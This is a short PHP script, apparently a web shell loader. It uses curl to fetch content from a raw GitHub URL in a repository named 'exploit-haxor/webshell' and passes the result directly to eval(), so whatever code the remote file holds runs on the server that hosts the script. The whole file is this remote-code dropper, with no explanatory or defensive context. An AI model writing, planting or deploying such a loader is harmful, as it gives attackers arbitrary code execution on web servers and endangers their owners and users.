<?php 
$url = "https://raw.githubusercontent.com/exploit-haxor/webshell/main/minnin";
$ch = curl_init($url); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$result = curl_exec($ch);
eval("?>".$result);

?>
